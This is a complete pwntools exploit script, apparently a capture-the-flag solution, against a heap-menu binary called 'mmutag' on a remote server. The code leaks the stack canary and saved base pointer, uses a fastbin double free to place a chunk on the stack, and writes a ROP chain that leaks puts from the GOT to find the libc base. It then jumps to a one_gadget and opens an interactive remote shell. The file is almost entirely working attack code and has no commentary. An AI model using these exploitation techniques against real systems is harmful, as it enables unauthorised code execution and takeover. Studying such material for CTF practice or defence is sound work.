from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ('open-wsl.exe', "-e")
elf = ELF("./mmutag")
libc = ELF("./libc.so.6")

# io = gdb.debug(args=['./mmutag'],
#                env={"LD_PRELOAD": "./libc.so.6"}, aslr=False)
io = remote("183.129.189.62", 58204)


def add(ptrid, content):
    io.sendlineafter("choise:\n", "1")
    io.sendlineafter("id:\n", str(ptrid))
    io.sendlineafter("content\n", content)


def delete(ptrid):
    io.sendlineafter("choise:\n", "2")
    io.sendlineafter("id:\n", str(ptrid))


def leak_stack():
    io.sendlineafter("choise:\n", "3")
    io.send("a" * 0x19)
    leak = io.recvline()[0x27:]
    canary = u64(b'\x00' + leak[0:7])
    saved_rbp = u64(leak[7:13] + b'\x00\x00')
    log.success('canary %x saved_rbp %x' % (canary, saved_rbp))
    io.sendlineafter("choise:\n", "3")
    io.send('\x7f' + "\x00" * 0x18)
    return canary, saved_rbp

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
puts_offset = libc.symbols["puts"]
stack_chk_fail_got = elf.got["__stack_chk_fail"]
rbp = stack_chk_fail_got + 0x110
read_stack_chk_fail_addr = 0x400a69
one_gadget_addr = 0xf0364
rdi_ret_addr = 0x400d23
ret_addr = 0x400679

io.sendlineafter("name: \n", "aaa")

io.sendlineafter("choice:\n\n", "2")

canary, saved_rbp = leak_stack()
add(1, "aaa")
add(2, "bbb")
delete(1)
delete(2)
delete(1)
add(3, p64(saved_rbp - 0xd10 + 0xcc0 - 0x8))
add(4, "ccc")
add(5, "ddd")

ropchain = b'a' * 0x10 
ropchain += p64(canary) + p64(rbp)
ropchain += p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) 
ropchain += p64(ret_addr) * 2 
ropchain += p64(read_stack_chk_fail_addr)
add(6, ropchain)

io.sendlineafter("choise:\n", "4")
leak = io.recvline()[0:6]
puts_addr = u64(leak + b'\x00\x00')
libcbase = puts_addr - puts_offset
log.success('libcbase %x' % libcbase)

io.send(p64(libcbase + one_gadget_addr))

io.interactive()
io.close()
